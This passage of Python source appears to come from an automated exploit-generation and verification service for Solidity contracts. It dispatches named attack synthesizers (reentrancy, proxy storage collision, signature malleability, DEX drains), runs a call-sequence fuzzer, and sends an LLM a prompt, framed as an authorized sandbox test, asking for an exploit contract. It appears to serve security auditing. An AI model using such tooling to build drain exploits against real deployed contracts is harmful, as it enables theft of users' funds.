    # 0t) Dex (스팟가격 반올림 반복 스왑 드레인)
    try:
        r = _synth_dex_drain(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0u) Good Samaritan (커스텀 에러 catch → 전액 인출)
    try:
        r = _synth_good_samaritan(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0z4) 커밋먼트 해시 off-by-one 충돌 (NotOptimisticPortal 류)
    try:
        r = _synth_commitment_collision(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0z3) Magic Animal Carousel (패킹 슬롯 nextId 오염)
    try:
        r = _synth_magic_carousel(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0z2) Impersonator (ECDSA 서명 가변성 → controller 탈취)
    try:
        r = _synth_ecdsa_malleability(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0z) Puzzle Wallet (프록시 스토리지 충돌 + multicall → admin 탈취)
    try:
        r = _synth_puzzle_wallet(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0y) Motorbike (초기화되지 않은 initializer → upgrader 선점)
    try:
        r = _synth_uninitialized(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0x) Stake (가짜 WETH 회계 버그 → 실 ETH 인출)
    try:
        r = _synth_stake_accounting(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0w) Gatekeeper Three (construct0r 선점 + send 실패 게이트)
    try:
        r = _synth_gatekeeper_three(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0v) EIP-7702 재진입 (mint 이전 콜백 + tx.origin EOA 게이트) — 동적 증명
    try:
        r = _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 1) 호출 시퀀스 탐색 — 점진 심화(progressive deepening) 루프.
    #    라운드마다 예산·시퀀스 깊이·입력 풀을 키워 "끝까지 물어뜯되", 판정은 항상
    #    배포직후 건강기준의 실제 효과 관찰이라 더 깊이 파도 오탐이 생기지 않는다.
    try: _max_s = float(os.environ.get("TRUST404_MAX_SECONDS", "9"))
    except Exception: _max_s = 9.0
    deadline = t0 + _max_s
    rounds = [(500, 2, 0), (1500, 2, 1), (4000, 3, 1)]
    attempted = 0
    for bud, dep, pool in rounds:
        if time.time() >= deadline: break
        attempted += 1
        try:
            found = _fuzz_search(name, target_src, invariants_src, manifest, do_verify,
                                 budget=bud, depth=dep, pool_level=pool, deadline=deadline)
        except Exception:
            found = None
        if not found:
            continue
        seq, payable_map, reason = found
        exploit_src = _fuzz_codegen(seq, payable_map)
        gen = {"step":"generate","title":f"Exploit.sol 생성 (fuzz · round {attempted})","strategy":"fuzz","exploit_src":exploit_src}
        try:
            if do_verify and invariants_src:
                proven,vsteps,meta=_verify_attempt(name,target_src,invariants_src,exploit_src,manifest)
            else:
                proven,vsteps,meta=_run_effect(name,target_src,exploit_src,manifest)
        except Exception:
            continue
        if not proven:
            continue   # 검증 실패 → 다음(더 깊은) 라운드로 계속 물어뜯는다
        return {"name":name,"proven":True,"firstViolated":meta.get("firstViolated",reason),
                "strategy":"fuzz ("+" → ".join(c.get("name","raw") for c in seq)+")",
                "steps":[scan_step,gen]+vsteps,"exploit_src":exploit_src,
                "mode":("verify" if (do_verify and invariants_src) else "effect"),
                "balance_before_wei":meta.get("balance_before_wei"),
                "balance_after_wei":meta.get("balance_after_wei"),
                "note":f"템플릿 미매치 → 범용 퍼저가 {attempted}라운드 점진 심화(깊이≤{dep}, 예산 {bud})로 시퀀스를 찾아 성립시켰습니다.",
                "ms":int((time.time()-t0)*1000)}
    return None

def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify=True,
                           analysis_src=None, seed=42, deadline=None,
                           include_templates=True, world_src=None, metrics=None,
                           search_errors=None):
    """트랙 자기검증 루프(agent.py)용 후보 생성기.

    탐색·생성 단계를 지연(lazy) 산출해 (stage, label, exploit_src) 로 내보낸다. 각 단계는
    앞 단계가 실패했을 때에만 소비되므로 '생성한 PoC 가 불변식을 위반하지 못하면 탐색과
    생성을 반복'하는 자기검증 루프의 탐색 축을 이룬다. 실제 검증(불변식 위반 확인)은
    호출자(verify.verify_candidate)가 수행한다 — 생성과 검증을 분리해 루프를 명시화한다.

    단계 순서(점점 강한 일반화):
      template  → 계열별 결정론 템플릿(정적 스코어 순)
      synth     → 재진입/AMM/플래시론/스토리지/프록시/다중블록/스토리지충돌/그리핑DoS/콜백 합성
      fuzz      → 범용 호출 시퀀스 탐색(SliSE 류 슬라이싱 우선순위) → codegen
    """
    search_src = analysis_src or target_src
    context_src = world_src or search_src
    if metrics is None:
        metrics = {}
    if search_errors is None:
        search_errors = []

    def metric(key, amount=1):
        metrics[key] = int(metrics.get(key, 0)) + amount

    def search_error(stage, provider, exc):
        metric("provider_errored")
        search_errors.append({
            "stage": stage,
            "provider": provider,
            "error": str(exc)[:300],
        })

    findings = scan_target(search_src, invariants_src or "", manifest)
    order = seeded_order(sorted(STRATEGY_ORDER, key=lambda f: (-findings["scores"].get(f,0), f)),
                         findings["scores"], seed)
    feats = None
    try:
        from trust404.features import extract_features
        feats = extract_features(search_src, name)
    except Exception:
        feats = None
    # 1) 템플릿 단계. Track agent already has a canonical outer template
    # stage, so it passes include_templates=False instead of verifying the
    # same call plan twice through this legacy API implementation.
    if include_templates:
        for fam in order:
            if deadline is not None and time.time() >= deadline:
                return
            try:
                src = build_exploit(fam, findings)
            except Exception:
                src = None
            if src:
                yield ("template", fam, src)
    # 2) 합성 단계 — 소스를 여러 개 낼 수 있는 생성기
    t0 = time.time(); scan_step = {"step":"scan","scores":findings["scores"],
                                  "features":sorted(feats) if feats else []}
    generators = (
        ("reentrancy", lambda: _synth_reentrancy(search_src)),
        ("amm", lambda: _synth_amm(context_src, name)),
        ("flashloan", lambda: _synth_flashloan(context_src, name)),
    )
    for provider_name, gen in generators:
        if deadline is not None and time.time() >= deadline:
            return
        try:
            for label, ex in gen():
                yield ("synth", label, ex)
        except Exception as exc:
            search_error("synth", provider_name, exc)
    # 2c) 일반화 DeFi/CTF 계열 (DVD Unstoppable/Truster/Selfie/Climber — 레벨명 없음)
    try:
        from trust404.synth_defi import iter_defi_families
        from trust404.registry import should_run as _sr_defi
        for label, ex in iter_defi_families(context_src, name):
            if deadline is not None and time.time() >= deadline:
                return
            fam = label.split(":")[0].replace("-", "_")
            if not _sr_defi(fam, feats):
                metric("provider_skipped")
                continue
            yield ("synth", label, ex)
    except Exception as exc:
        search_error("synth", "defi-families", exc)
    # 2d) 교차 컨트랙트 월드 모델 — 시퀀스를 run(address) 로 접음 (ReX 약점)
    try:
        from trust404.world import iter_world_candidates
        for label, ex in iter_world_candidates(context_src, name, feats):
            if deadline is not None and time.time() >= deadline:
                return
            yield ("world", label, ex)
    except Exception as exc:
        search_error("world", "world-model", exc)
    # 2b) 합성 단계 — 실행으로 소스를 확정하는 단일 결과형 생성기
    # 레벨 솔버는 계열 capability 로 게이트된다 (trust404.registry).
    # 피처가 없으면 전부 실행(폴백). 태그가 안 겹치면 컴파일/배포를 건너뛴다.
    inv = invariants_src if do_verify else None
    _synth_fns = (_storage_attempt, _proxy_attempt, _multiblock_attempt,
               _synth_storage_collision, _synth_king_dos, _synth_callback_inconsistency,
               _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force,
               _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber,
               _synth_higher_order, _synth_switch, _synth_array_underflow,
               _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan,
               _synth_eip7702_reentrancy, _synth_gatekeeper_three, _synth_stake_accounting,
               _synth_uninitialized, _synth_puzzle_wallet, _synth_ecdsa_malleability,
               _synth_magic_carousel, _synth_commitment_collision)
    try:
        from trust404.registry import should_run as _should_run
        from trust404.hkg import order_by_hkg as _hkg_order
    except Exception:
        _should_run = lambda _n, _f: True
        _hkg_order = lambda ns, _f: list(ns)
    _ordered = _hkg_order([fn.__name__ for fn in _synth_fns], feats)
    _by = {fn.__name__: fn for fn in _synth_fns}
    for fn_name in _ordered:
        if deadline is not None and time.time() >= deadline:
            return
        fn = _by[fn_name]
        if not _should_run(fn.__name__, feats):
            metric("provider_skipped")
            continue
        try:
            r = fn(name, target_src, inv, manifest, scan_step, t0)
        except Exception as exc:
            search_error("synth", fn_name, exc)
            r = None
        if isinstance(r, dict) and r.get("exploit_src"):
            yield ("synth", r.get("strategy") or fn.__name__, r["exploit_src"])
    # 3) 범용 퍼저 단계
    metric("fuzz_executions")
    try:
        found = _fuzz_search(name, target_src, inv, manifest, bool(do_verify),
                             deadline=deadline)
    except Exception as exc:
        search_error("fuzz", "sequence-search", exc)
        found = None
    if found:
        seq, payable_map, reason = found
        label = "fuzz(" + " → ".join(c.get("name", "raw") for c in seq) + ")"
        try:
            yield ("fuzz", label, _fuzz_codegen(seq, payable_map))
        except Exception as exc:
            search_error("fuzz", "codegen", exc)


def prove_sources(name, target_src, invariants_src, manifest, do_verify=True, extra_candidates=None):
    t0 = time.time()
    findings = scan_target(target_src, invariants_src or "", manifest)
    order = seeded_order(sorted(STRATEGY_ORDER, key=lambda f: (-findings["scores"].get(f,0), f)),
                         findings["scores"], 42)
    candidates = list(extra_candidates or [])
    for fam in order:
        src = build_exploit(fam, findings)
        if src:
            candidates.append((fam, src))
    scan_step = {"step":"scan","title":"정적 분석 · 전략 선택","scores":findings["scores"],
                 "strategy":(candidates[0][0] if candidates else None)}
    if not candidates:
        use_inv = invariants_src if (do_verify and invariants_src) else None
        fz = _fuzz_fallback(name, target_src, use_inv, manifest, bool(use_inv), scan_step, t0)
        if fz: return fz
        return {"name":name,"proven":False,"firstViolated":"","strategy":None,"steps":[scan_step],
                "exploit_src":None,"mode":"analyze","note":"공격 패턴 미검출 (템플릿·퍼저 모두 미성립)",
                "ms":int((time.time()-t0)*1000)}
    if not do_verify or not invariants_src:
        # No invariants: actually RUN each candidate and observe real effects
        # (drained ETH / owner hijack / debt>collateral) via a synthesized check.
        last = None
        for fam, src in candidates:
            gen = {"step":"generate","title":"Exploit.sol 생성","strategy":fam,"exploit_src":src}
            try:
                exploited, esteps, meta = _run_effect(name, target_src, src, manifest)
            except Exception as e:
                last = {"name":name,"proven":False,"firstViolated":"","strategy":fam,
                        "steps":[scan_step,gen],"exploit_src":src,"mode":"effect",
                        "error":str(e)[:300],"ms":int((time.time()-t0)*1000)}
                continue
            res = {"name":name,"proven":exploited,"firstViolated":meta.get("firstViolated",""),
                   "strategy":fam,"steps":[scan_step,gen]+esteps,"exploit_src":src,"mode":"effect",
                   "balance_before_wei":meta.get("balance_before_wei"),
                   "balance_after_wei":meta.get("balance_after_wei"),
                   "note":"불변식 미제공 — 자동 합성 효과 검사로 실제 실행했습니다.",
                   "ms":int((time.time()-t0)*1000)}
            if exploited:
                return res
            last = res
        fz = _fuzz_fallback(name, target_src, invariants_src or None, manifest, False, scan_step, t0)
        if fz: return fz
        return last
    # verify mode: try each candidate strategy until one PROVES
    last = None
    for fam, src in candidates:
        try:
            proven, vsteps, meta = _verify_attempt(name, target_src, invariants_src, src, manifest)
        except Exception as e:
            last = {"name":name,"proven":False,"firstViolated":"","strategy":fam,
                    "steps":[scan_step,{"step":"generate","title":"Exploit.sol 생성","strategy":fam,"exploit_src":src}],
                    "exploit_src":src,"mode":"verify","error":str(e)[:300],"ms":int((time.time()-t0)*1000)}
            continue
        steps = [scan_step,{"step":"generate","title":"Exploit.sol 생성","strategy":fam,"exploit_src":src}] + vsteps
        res = {"name":name,"proven":proven,"firstViolated":meta.get("firstViolated",""),"strategy":fam,
               "steps":steps,"exploit_src":src,"mode":"verify",
               "balance_before_wei":meta.get("balance_before_wei"),"balance_after_wei":meta.get("balance_after_wei"),
               "ms":int((time.time()-t0)*1000)}
        if proven:
            return res
        last = res
    fz = _fuzz_fallback(name, target_src, invariants_src, manifest, True, scan_step, t0)
    if fz: return fz
    return last

def _attach_inputs(res, target_src, invariants_src, manifest):
    """스펙상 '입력 세트'(타깃 소스·불변식·매니페스트)를 응답에 실어, UI가 제출물
    옆에 입력까지 함께 보여줄 수 있게 한다."""
    if isinstance(res, dict) and "error" not in res:
        res.setdefault("target_src", target_src)
        res.setdefault("invariants_src", invariants_src or "")
        try:
            res.setdefault("manifest_json", json.dumps(manifest, indent=2, ensure_ascii=False))
        except Exception:
            pass
    return res


def prove(name):
    d = TARGETS[name]
    res = prove_sources(name, d["src"], d["inv"], d["manifest"], do_verify=True)
    return _attach_inputs(res, d["src"], d["inv"], d["manifest"])

def _run(name):
    if name not in TARGETS:
        return {"error":f"unknown target: {name}","targets":list(TARGETS.keys())}
    try:
        return prove(name)
    except Exception as e:
        return {"name":name,"error":str(e)[:400],"trace":traceback.format_exc()[-800:]}

def _run_custom(body):
    try:
        data = json.loads(body or "{}")
    except Exception as e:
        return {"error":"invalid JSON body: "+str(e)[:120]}
    contract = (data.get("contract") or "").strip()
    invariants = (data.get("invariants") or "").strip()
    if not contract:
        return {"error":"'contract' source is required"}
    # 의존성(import) 있는 컨트랙트: 클라이언트가 웹 검색/첨부로 해결한 소스 맵을 받아 평탄화
    explicit_name = (data.get("targetName") or "").strip()
    name = explicit_name or infer_target_name(contract)
    srcs = data.get("sources")
    flat_note = None
    if isinstance(srcs, dict) and srcs:
        try:
            main_body = contract
            deps = {k: v for k, v in srcs.items() if isinstance(v, str)}
            flat = _flatten_sources(main_body, deps)
            if len(flat) <= MAX_SRC * 6:
                contract = flat
                flat_note = f"의존성 {len(deps)}개를 평탄화해 단일 소스로 컴파일했습니다."
        except Exception as e:
            flat_note = "의존성 평탄화 실패: " + str(e)[:120]
    if len(contract) > MAX_SRC * 6 or len(invariants) > MAX_SRC:
        return {"error":f"source too large after flatten"}
    if not name:
        return {"error":"could not find a contract definition in 'contract'"}
    manifest = _default_manifest()
    um = data.get("manifest")
    if isinstance(um, str) and um.strip():
        try: um = json.loads(um)
        except Exception as e: return {"error":"invalid manifest JSON: "+str(e)[:120]}
    if isinstance(um, dict):
        for k,v in um.items():
            if isinstance(v,dict): manifest.setdefault(k,{}).update(v)
            else: manifest[k]=v
    _user_gave_ctor = bool(manifest.get("deploy", {}).get("constructor_args"))
    def _manifest_for(cand_name):
        # 후보마다 생성자 인자를 새로 합성한다(라이브 콘솔이 CLI(audit.py)와 동등하게
        # 생성자 있는 실제 컨트랙트를 배포하도록). 사용자가 직접 준 인자는 그대로 둔다.
        import copy as _copy
        m = _copy.deepcopy(manifest)
        d = m.setdefault("deploy", {})
        if not _user_gave_ctor:
            try:
                cargs, _cpay = _synth_ctor_args(cand_name, contract)
                if cargs:
                    d["constructor_args"] = cargs
                    m.setdefault("_synth", {})["constructor_args"] = True
                    # 비-payable 생성자 시드는 downstream(_ctor_payable 게이트)에서 0 처리됨
            except Exception:
                pass
        return m
    import time as _t; t0=_t.time()
    # 1) user/LLM-provided exploit -> verify only
    override=(data.get("exploitOverride") or "").strip()
    if override:
        if len(override)>MAX_SRC: return {"error":"exploit too large"}
        man1 = _manifest_for(name)
        try:
            return _attach_inputs(_run_override(name, contract, invariants or None, man1, override, t0),
                                  contract, invariants or None, man1)
        except Exception as e:
            return {"name":name,"error":str(e)[:400],"trace":traceback.format_exc()[-700:]}
    # 2) optional server-side LLM draft as first candidate (falls back to templates+fuzzer)
    llm_note=None
    cfg=data.get("llm")
    def _llm_extra(cand_name, man):
        if not (isinstance(cfg,dict) and (cfg.get("provider") or cfg.get("base") or cfg.get("key"))):
            return None
        try:
            findings=scan_target(contract, invariants or "", man)
            draft=_llm_generate(contract, invariants or "", findings, cfg)
            if draft: return [("llm", draft)]
        except Exception as e:
            nonlocal llm_note
            llm_note="LLM 사용 실패 → 템플릿/퍼저로 진행: "+str(e)[:140]
        return None

    # 후보 타깃 목록: 사용자가 targetName 을 명시하면 그것만, 아니면 소스 안의 모든 구체
    # 컨트랙트를 '취약해 보이는 순서'로 순회한다. (파일에 라이브러리/헬퍼가 섞여 있어도
    # 취약본을 찾을 때까지 루프로 물어뜯는다 — '마지막 컨트랙트'만 찍던 버그 제거.)
    if explicit_name:
        candidates = [explicit_name]
    else:
        candidates = concrete_targets(contract) or ([name] if name else [])
        if name and name not in candidates:
            candidates.append(name)
    if not candidates:
        return {"error":"could not find a contract definition in 'contract'"}
    # 다중 후보면 후보당 퍼징 예산을 줄여 전체 시간이 폭주하지 않게 한다(Vercel maxDuration).
    _budget_saved = os.environ.get("TRUST404_MAX_SECONDS")
    if len(candidates) > 1:
        try:
            total = float(_budget_saved) if _budget_saved else 9.0
        except Exception:
            total = 9.0
        per = max(3.0, min(total, 45.0 / len(candidates)))
        os.environ["TRUST404_MAX_SECONDS"] = str(per)
    last = None; tried = []
    try:
        for cand in candidates:
            tried.append(cand)
            man = _manifest_for(cand)
            extra = _llm_extra(cand, man)
            try:
                res = prove_sources(cand, contract, invariants or None, man,
                                    do_verify=bool(invariants), extra_candidates=extra)
            except Exception as e:
                last = {"name":cand,"error":str(e)[:400],"trace":traceback.format_exc()[-700:]}
                continue
            if isinstance(res, dict) and res.get("proven"):
                if llm_note: res["llm_note"]=llm_note
                if flat_note: res["flatten_note"]=flat_note
                if len(tried) > 1:
                    res["note"] = (res.get("note") or "") + \
                        f" · 소스 내 {len(candidates)}개 컨트랙트를 순회해 취약 컨트랙트 '{cand}' 를 찾아 증명했습니다."
                return _attach_inputs(res, contract, invariants or None, man)
            last = res
    finally:
        if len(candidates) > 1:
            if _budget_saved is None:
                os.environ.pop("TRUST404_MAX_SECONDS", None)
            else:
                os.environ["TRUST404_MAX_SECONDS"] = _budget_saved
    # 아무 후보도 성립 못함 → 마지막 결과 + 정적 휴리스틱으로 'NO PATTERN' 대신 근거 있는 경고
    res = last or {"name":name,"proven":False,"strategy":None,"note":"공격 패턴 미검출"}
    if llm_note: res["llm_note"]=llm_note
    if flat_note: res["flatten_note"]=flat_note
    if len(candidates) > 1:
        res["note"] = (res.get("note") or "") + \
            f" · 소스 내 {len(candidates)}개 컨트랙트({', '.join(candidates[:6])})를 모두 순회했으나 미성립."
    if isinstance(res, dict) and not res.get("proven") and "error" not in res:
        try:
            h = static_findings(contract)
        except Exception:
            h = []
        if h:
            res["heuristics"] = h
            res["note"] = (res.get("note") or "") + \
                f" · 동적 증명은 미성립이나 정적 휴리스틱 {len(h)}건 발견(예: {h[0]['title']})."
    return _attach_inputs(res, contract, invariants or None, _manifest_for(name))

import urllib.request as _ureq

def _http_post(url, payload, headers, timeout):
    req=_ureq.Request(url, data=json.dumps(payload).encode(), headers=headers, method="POST")
    with _ureq.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read())

def _extract_solidity(text):
    m=re.search(r"```(?:solidity)?\s*(.*?)```", text, re.S)
    code=m.group(1) if m else text
    if "contract Exploit" not in code:
        raise ValueError("LLM output has no contract Exploit")
    head=code.split("\n",1)[0]
    if not code.lstrip().startswith("//") and "pragma" not in head:
        code="// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n"+code
    return code

def _llm_prompt(contract, invariants, findings):
    preds=", ".join(findings.get("invariant_predicates",[]))
    top=sorted(findings["scores"].items(), key=lambda kv:-kv[1])
    hint=", ".join(f"{k}:{v}" for k,v in top)
    return ("You are generating a Foundry PoC for an AUTHORIZED, sandboxed security "
            "evaluation (isolated in-memory EVM, no real funds). Output ONLY a Solidity "
            "file with `contract Exploit { function run(address target) external payable; }` "
            "and a payable receive(). The harness pre-funds Exploit with 10 ether. Break at "
            f"least one invariant (predicates: {preds}). No external imports.\n\n"
            f"// scanner hint: {hint}\n\n// ===== TARGET =====\n{contract}\n\n"
            f"// ===== INVARIANTS =====\n{invariants or '(none provided)'}\n")

def _llm_generate(contract, invariants, findings, cfg, timeout=90):
    provider=(cfg.get("provider") or "").lower()
    base=(cfg.get("base") or "").strip()
    model=(cfg.get("model") or "").strip()
    key=(cfg.get("key") or "").strip()
    prompt=_llm_prompt(contract, invariants, findings)
    if provider in ("anthropic","claude") or (not base and key):
        data=_http_post("https://api.anthropic.com/v1/messages",
                        {"model":model or "claude-sonnet-5","max_tokens":2000,"temperature":0,
                         "messages":[{"role":"user","content":prompt}]},
                        {"content-type":"application/json","x-api-key":key,
                         "anthropic-version":"2023-06-01"}, timeout)
        text="".join(b.get("text","") for b in data.get("content",[]))
    else:
        url=base.rstrip("/")
        if not url.endswith("/chat/completions"):
            url=url+("/chat/completions" if url.endswith("/v1") else "/v1/chat/completions")
        headers={"content-type":"application/json"}
        if key: headers["authorization"]="Bearer "+key
        data=_http_post(url, {"model":model or "gpt-4o-mini","temperature":0,
                              "messages":[{"role":"user","content":prompt}]}, headers, timeout)
        text=data["choices"][0]["message"]["content"]
    return _extract_solidity(text)

def _run_override(name, target_src, invariants_src, manifest, exploit_src, t0):
    do_verify=bool(invariants_src)
    gen={"step":"generate","title":"Exploit.sol (제공됨)","strategy":"provided","exploit_src":exploit_src}
    try:
        if do_verify:
            proven,vsteps,meta=_verify_attempt(name,target_src,invariants_src,exploit_src,manifest)
        else:
            proven,vsteps,meta=_run_effect(name,target_src,exploit_src,manifest)
    except Exception as e:
        return {"name":name,"proven":False,"strategy":"provided","exploit_src":exploit_src,
                "steps":[gen],"mode":("verify" if do_verify else "effect"),
                "error":str(e)[:300],"ms":int((time.time()-t0)*1000)}
    return {"name":name,"proven":proven,"firstViolated":meta.get("firstViolated",""),
            "strategy":"provided (수동/LLM)","exploit_src":exploit_src,"steps":[gen]+vsteps,
            "mode":("verify" if do_verify else "effect"),
            "balance_before_wei":meta.get("balance_before_wei"),
            "balance_after_wei":meta.get("balance_after_wei"),
            "note":"제공된 Exploit.sol 을 그대로 실행·검증했습니다.","ms":int((time.time()-t0)*1000)}

class handler(BaseHTTPRequestHandler):
    def _send(self, code, obj):
        b = json.dumps(obj, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type","application/json; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type")
        self.send_header("Cache-Control","no-store")
        self.end_headers()
        self.wfile.write(b)
    def do_OPTIONS(self):
        self._send(200, {"ok":True})
    def do_GET(self):
        q = parse_qs(urlparse(self.path).query)
        name = (q.get("target") or [""])[0]
        if not name:
            return self._send(200, {"targets":list(TARGETS.keys()),
                                    "usage":"GET ?target=<Name> | POST {contract,invariants?,manifest?,targetName?}"})
        self._send(200, _run(name))
    def do_POST(self):
        try:
            n = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        except Exception as e:
            return self._send(400, {"error":"read body failed: "+str(e)[:120]})
        self._send(200, _run_custom(body))
